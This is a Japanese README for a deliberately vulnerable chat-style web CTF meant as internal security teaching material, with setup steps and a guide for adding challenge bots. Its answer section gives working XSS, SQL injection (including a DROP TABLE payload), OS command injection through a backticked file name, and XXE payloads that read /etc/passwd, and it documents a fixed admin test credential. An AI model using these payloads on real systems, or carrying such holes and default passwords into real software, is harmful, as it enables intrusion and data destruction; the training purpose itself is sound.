# chat-ctf (公開サーバでの利用はしないでください)
chatアプリケーション風WebCTFサイト。
内部ネットワーク内での利用を想定した、セキュリティ教材です。

## 依存
- docker-compose
- mkcert
- sqlite3

## 起動手順

```sh
$ git clone https://github.com/TakuKitamura/chat-ctf.git
$ cd chat-ctf
$ sudo docker compose up -d
$ vim src/.env.development # 適切なものを設定。
$ # IPは、サーバのIPアドレス
SECRET_COOKIE_PASSWORD=xxx # 30文字以上に設定してください
IP=192.168.1.x
$ vim src/.env.production # 適切なものを設定
SECRET_COOKIE_PASSWORD=xxx # 30文字以上に設定してください
IP=192.168.1.x
$ cd src
$ ./setup-db.sh # Admin/Adm1nAdm1n というテストアカウントも追加されます。
$ mkcert 192.168.1.x
$ cd ..
$ sudo docker compose exec app yarn install
$ sudo docker compose exec app yarn build && sudo docker compose exec app yarn start
$ # or
$ sudo docker compose exec app yarn dev
```
https://192.168.1.x/login でログインできます。

https://192.168.1.x/signup でアカウントを作成できます。

CSVファイルからのアカウント一括作成も可能です。

```sh
$ vim /tmp/user.csv # 一例
UserID,Password,IconURL
Test1,Maixuo7p,https://example.com/1.jpg
Test2,eoch2ieP,https://example.com/2.jpg
$ cd chat-ctf/src
$ ./add-users.sh -f /tmp/user.csv -i 192.168.1.x
```

### Adminアカウント専用機能
- Adminアカウント(`Admin/Adm1nAdm1n`)でログインし、適当なテキストボックスで`/reset-chat`と入力するとchatデータがDBから削除される。画面更新をすると、chat履歴が消えていることを確認できる。

<details>

<summary>問題の回答</summary>

### Echo Bot [XSS]

ブラウザのDeveloper ToolでUser Agentを下記のように変更。
```
"><img src=x onerror="alert()"><!--
```

そして、適当なメッセージを入力し送信する。

### アーティスト検索 Bot [SQL Injection]

下記のメッセージを入力し送信する。
```
search=santana
n='; DROP TABLE user; --
```

### グレースケール変換 Bot [OS Command Injection]

アップロードする画像のファイル名を例えば以下に変え、アップロードする。
```
example`sleep 3`.jpg
```

### FizzBuzz Bot [XSS]

https://192.168.1.x?q=%3Cimg%20src=%22x%22%20onerror=%22alert()%22%3E

というようなURLにアクセスした上で、下記メッセージを入力し送信する。
```
n=200
```

### Excel解析 Bot [XXE]

適当なGoogleスプレッドシートを作成し、Microsoft Excel形式でダウンロード。ファイル名をexample.xlsxとする。
以下のように細工したファイルを作成する。

```sh
$ mkdir tmp
$ mv example.xlsx tmp
$ cd tmp
$ unzip example.xlsx
$ ls
[Content_Types].xml  _rels  example.xlsx  xl
$ cat xl/sharedStrings.xml # 出力結果は例
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="8" uniqueCount="4"><si><t>AAA</t></si><si><t>BBB</t></si><si><t>CCC</t></si><si><t>DDD</t></si></sst>
$ vim xl/sharedStrings.xml # 例
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [ 
    <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="8" uniqueCount="4"><si><t>&xxe;</t></si><si><t>BBB</t></si><si><t>CCC</t></si><si><t>DDD</t></si></sst>
$ zip -r crafted.xlsx '[Content_Types].xml' _rels xl
  adding: [Content_Types].xml (deflated 71%)
  adding: _rels/ (stored 0%)
  adding: _rels/.rels (deflated 40%)
  adding: xl/ (stored 0%)
  adding: xl/workbook.xml (deflated 58%)
  adding: xl/worksheets/ (stored 0%)
  adding: xl/worksheets/sheet1.xml (deflated 64%)
  adding: xl/worksheets/_rels/ (stored 0%)
  adding: xl/worksheets/_rels/sheet1.xml.rels (deflated 40%)
  adding: xl/drawings/ (stored 0%)
  adding: xl/drawings/drawing1.xml (deflated 66%)
  adding: xl/styles.xml (deflated 61%)
  adding: xl/theme/ (stored 0%)
  adding: xl/theme/theme1.xml (deflated 78%)
  adding: xl/_rels/ (stored 0%)
  adding: xl/_rels/workbook.xml.rels (deflated 66%)
  adding: xl/sharedStrings.xml (deflated 26%)
```

そして、crafted.xlsxをアップロードする。

</details>

---

# Bot問題追加ガイド

チャット形式CTFの各問題を `src/lib/bots/bot<number>.ts` の形式で実装しています。  
新しい問題を追加する際は、以下のルールに従ってください。

## 1. ファイル命名規則

- ファイル名は `bot1.ts`, `bot2.ts`, `bot3.ts` のように連番で命名します。
- 重複しない番号を使用してください。
- ファイル内のロジックで、問題に正解した場合は `gotFlag: true` を返すようにしてください。

## 2. Bot関数の構成

すべての Bot ファイルは、以下のように `default export` される `async` 関数を定義します。

```ts
import { BotHandlerArgs } from './types';
const escape = require('escape-html');

export default async function bot({
  req,
  message,
  file
}: BotHandlerArgs) {
  return {
    gotFlag: false,
    html: escape("出力メッセージ")
  };
}
```

戻り値の構造：

```ts
{
  gotFlag: boolean, // 正解時 true、不正解時 false
  html: string      // 表示するHTML文字列（ユーザ由来の入力は、escape必須）
}
```

## 3. 入力とユーティリティ関数

### BotHandlerArgs

すべての Bot は以下の引数を受け取ります：

- `req: NextApiRequest` - HTTPリクエストオブジェクト
  - https://www.jsdocs.io/package/next#NextApiRequest
- `message: string` - ユーザが送信したメッセージ
- `file: File` - ファイル情報（ファイルがアップロードされていなければ、undefined）
  - https://www.jsdocs.io/package/@types/formidable#File

### validCheckEnv の使い方

クエリ形式の `message` をパース・バリデーションする際には、共通ユーティリティ `validCheckEnv()` を使ってください。

```ts
import { validCheckEnv } from 'lib/ctf';

const result = validCheckEnv(message, ['key1', 'key2']);

if (!result.valid) {
  return {
    gotFlag: false,
    html: '<h3>Invalid Format</h3>'
  };
}

const key1 = result.params.key1;
const key2 = result.params.key2;
```

この関数は以下の形式のメッセージをパースします：

```
key1=value1&key2=value2
```

指定されたキーがすべて存在するかをチェックし、不正な形式であれば `valid: false` を返します。

## 4. Ctfテーブルへの登録

Bot を追加したら、対応するエントリを `Ctf` テーブルに追加してください。

### 対象ファイル

- `src/migrations/003-ctf.sql` を編集します。

### レコード追加形式

```sql
INSERT INTO Ctf (id, title, template, attachmentButton)
VALUES (<bot番号>, '<問題タイトル>', '<初期入力テンプレート>', <true|false>);
```

- `id`: `bot<number>.ts` の `<number>` と一致させること。
- `title`: チャットUIに表示される問題名。
- `template`: 入力フォームに事前表示される文字列（HTML可）。
- `attachmentButton`: ファイルアップロード用ボタンを表示するかどうか（`true` または `false`）。

### 反映方法

編集後は必ず、以下のスクリプトを実行してDBを再セットアップしてください：

```bash
$ cd src
$ ./setup-db.sh
```

これにより、CTF UI に新しい Bot が表示されます。
